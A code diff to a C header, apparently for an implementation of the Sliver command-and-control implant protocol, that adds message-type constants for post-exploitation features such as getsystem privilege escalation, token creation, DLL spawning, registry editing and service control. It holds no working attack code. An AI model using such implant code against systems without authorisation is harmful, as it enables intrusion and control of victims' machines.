@@ -348,6 +348,29 @@ int sliver_execute_encode(sliver_buf_t *out, uint32_t status, const void *stdout
 #define SLIVER_MSG_PORTFWD 81u
 #define SLIVER_MSG_BEACON_REGISTER 93u
 #define SLIVER_MSG_BEACON_TASKS 94u
+/* Request/response pairs used by the Windows/privilege/service/registry handlers.
+ * Several services answer on the request type id (no distinct response constant in
+ * constants.go), so those macros repeat the value intentionally. */
+#define SLIVER_MSG_REV_TO_SELF_REQ 31u
+#define SLIVER_MSG_INVOKE_GETSYSTEM_REQ 32u
+#define SLIVER_MSG_GETSYSTEM 33u
+#define SLIVER_MSG_SPAWN_DLL_REQ 40u
+#define SLIVER_MSG_SPAWN_DLL 41u
+#define SLIVER_MSG_MAKE_TOKEN_REQ 64u
+#define SLIVER_MSG_MAKE_TOKEN 65u
+#define SLIVER_MSG_REGISTRY_READ_REQ 71u
+#define SLIVER_MSG_REGISTRY_WRITE_REQ 72u
+#define SLIVER_MSG_REGISTRY_CREATE_KEY_REQ 73u
+#define SLIVER_MSG_GETPRIVS_REQ 87u
+#define SLIVER_MSG_REGISTRY_SUBKEYS_LIST_REQ 88u
+#define SLIVER_MSG_REGISTRY_LIST_VALUES_REQ 89u
+#define SLIVER_MSG_REGISTRY_DELETE_KEY_REQ 97u
+#define SLIVER_MSG_GREP_REQ 129u
+#define SLIVER_MSG_SERVICES_REQ 130u
+#define SLIVER_MSG_SERVICE_DETAIL_REQ 131u
+#define SLIVER_MSG_START_SERVICE_BY_NAME_REQ 132u
+#define SLIVER_MSG_REGISTRY_READ_HIVE_REQ 133u
+#define SLIVER_MSG_EXECUTE_CHILDREN_REQ 136u
 
 #ifdef __cplusplus
 }
